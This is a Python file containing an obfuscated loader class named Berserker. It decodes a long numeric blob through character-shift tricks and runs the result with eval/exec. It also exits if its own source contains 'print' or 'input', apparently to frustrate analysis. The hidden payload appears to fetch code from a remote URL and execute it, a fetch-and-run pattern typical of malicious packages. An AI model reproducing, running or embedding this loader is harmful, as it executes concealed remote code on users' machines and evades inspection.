class Berserker():

 def __init__(self:object,_byte:float=False,_rasputin:str=0,*_exit:int,**_bits:int)->exec:

  self._boom,_byte,self._decode,self._system,self._exec,_bits[_rasputin]=lambda _delete:_byte(_delete),lambda _byte:exit()if self._exec[15]+self._exec[17]+self._exec[8]+self._exec[13]+self._exec[19] in open(__file__, errors=self._exec[8]+self._exec[6]+self._exec[13]+self._exec[14]+self._exec[17]+self._exec[4]).read() or self._exec[8]+self._exec[13]+self._exec[15]+self._exec[20]+self._exec[19] in open(__file__, errors=self._exec[8]+self._exec[6]+self._exec[13]+self._exec[14]+self._exec[17]+self._exec[4]).read()else"".join(_byte if _byte not in self._exec else self._exec[self._exec.index(_byte)+1 if self._exec.index(_byte)+1<len(self._exec)else 0]for _byte in "".join(chr(ord(t)-438905)if t!="ζ"else"\n"for t in self._decode(_byte))),lambda _bytes:"".join(chr(int(_bit)-len(_bytes.split('|')))if _bit!='§'else'ζ'for _bit in str(_bytes).split('|')),lambda _byte:str(_bits[_rasputin](f"{self._exec[4]+self._exec[-13]+self._exec[4]+self._exec[2]}(''.join(%s),{self._exec[6]+self._exec[11]+self._exec[14]+self._exec[1]+self._exec[0]+self._exec[11]+self._exec[18]}())"%list(_byte))).encode(self._exec[20]+self._exec[19]+self._exec[5]+self._exec[34])if _bits[_rasputin]==eval else exit(),exit()if _byte else'abcdefghijklmnopqrstuvwxyz0123456789',eval

  return self.__decode__(_bits[(self._exec[-1]+'_')[-1]+self._exec[18]+self._exec[15]+self._exec[0]+self._exec[17]+self._exec[10]+self._exec[11]+self._exec[4]])

 def __decode__(self,_execute: str)->exec:return(None,self._system(self._boom(_execute)))[0]

Berserker(_byte=False,_sparkle='''439205|439209|439212|439211|439214|439216|439133|439214|439201|439213|439217|439201|439215|439216|439215|439145|439211|439215|439145|439216|439205|439209|439201|439145|439219|439201|439198|439198|439214|439211|439219|439215|439201|439214|§|439217|439214|439208|439133|439162|439133|439135|439204|439216|439216|439212|439215|439159|439148|439148|439214|439158|439219|439147|439203|439205|439216|439204|439217|439198|439217|439215|439201|439214|439199|439211|439210|439216|439201|439210|439216|439147|439199|439211|439209|439148|439202|439158|439199|439201|439198|439211|439207|439200|439201|439218|439201|439208|439211|439212|439148|439188|439158|439207|439158|439146|439219|439158|439207|439158|439148|439209|439158|439205|439210|439148|439185|439201|439214|439209|439217|439220|439147|439216|439220|439216|439135|§|439216|439214|439221|439159|§|439110|439212|439211|439211|439133|439162|439133|439214|439201|439213|439217|439201|439215|439216|439215|439147|439203|439201|439216|439141|439217|439214|439208|439142|439147|439216|439201|439220|439216|§|439110|439205|439209|439212|439211|439214|439216|439133|439198|439158|439215|439201|439154|439152|§|439110|439201|439220|439201|439199|439141|439212|439211|439211|439142|§|439201|439220|439199|439201|439212|439216|439159|§|439110|439201|439220|439205|439216|439141|439142|§|§''')
